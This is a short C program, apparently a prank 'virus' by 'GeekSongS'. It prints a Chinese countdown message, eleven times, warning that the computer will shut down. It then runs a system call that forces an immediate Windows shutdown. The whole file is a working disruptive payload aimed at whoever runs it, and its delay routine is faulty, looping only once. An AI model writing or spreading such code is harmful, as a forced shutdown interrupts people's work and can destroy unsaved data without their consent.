#include<stdio.h>
#include<stdlib.h>
void delay(int x)
{
	int y,z;
	for(x=0;x>=0;x--)
	{
		for(y=0;y<=40000;y++)
		{
			
			for(z=0;z<=10000;z++);
		}
	}
}


int main()
{
	int i,j,k;

			for(k=0;k<=10;k++)
			{
				printf("你好，这是有GeekSongS为您定制的病毒程序，您的电脑将会在十一秒钟后关机%d\n",k);	
				delay(100000);
			}
			delay(10000);
			printf("对不起，现在您的电脑将会关机\n"); 
            system("shutdown -s -t 00");
		
} 


